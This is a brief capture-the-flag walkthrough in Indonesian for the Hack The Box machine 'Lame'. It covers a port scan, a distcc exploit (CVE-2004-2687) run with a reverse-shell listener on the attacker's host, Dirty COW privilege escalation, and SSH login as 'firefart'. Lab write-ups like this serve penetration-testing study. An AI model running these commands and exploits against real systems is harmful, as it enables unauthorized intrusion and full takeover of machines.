## Solver

Foothold
Melakukan port scanning dan didapatkan beberapa port yang aktif 21,22,139,445,3632
Browsing port 3632 didapatkan PoC mengenai CVE-2004-2687
Download public exploit dari github https://github.com/k4miyo/CVE-2004-2687/blob/k4miyo/CVE-2004-2687.py

Initial Access
Jalankan netcat listener pada port 1234
Jalankan exploit python3 CVE-2004-2687.py --rhost lame.htb --rport 3632 --lhost 10.10.14.13 --lport 1234
Didapatkan shell dengan user daemon

Privilege Escalation
Check kernel version
Kernel version 2.6.24-16-server vulnerable to CVE-2016-5195
Run exploit

SSH to user firefart ssh -oHostKeyAlgorithms=+ssh-dss firefart@lame.htb
Pwned!